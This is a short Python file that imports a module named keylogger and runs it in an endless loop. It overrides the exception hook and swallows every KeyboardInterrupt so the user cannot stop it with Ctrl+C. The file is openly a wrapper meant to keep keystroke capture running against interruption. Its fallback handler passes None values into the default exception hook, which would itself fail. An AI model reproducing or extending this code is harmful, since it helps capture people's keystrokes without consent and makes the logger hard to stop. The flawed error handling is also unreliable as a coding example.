# keeps the code running forever

import sys
import time
import keylogger

def _suppress_keyboard_interrupt(exctype, value, tb):
    if exctype is KeyboardInterrupt:
        return
    sys.__excepthook__(exctype, value, tb)

sys.excepthook = _suppress_keyboard_interrupt


def run_forever(INPUT : str):

    while True:
        try:
            keylogger.on_press(INPUT)
            time.sleep(0)
        except KeyboardInterrupt:
            print("\nKeyboardInterrupt. No problem", flush=True)
            try:
                time.sleep(0.1)
            except KeyboardInterrupt:
                _suppress_keyboard_interrupt(None, None, None)
            continue
        except Exception as e:
            print(f"error occurred {e}", file=sys.stderr, flush=True)
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                _suppress_keyboard_interrupt(None, None, None)
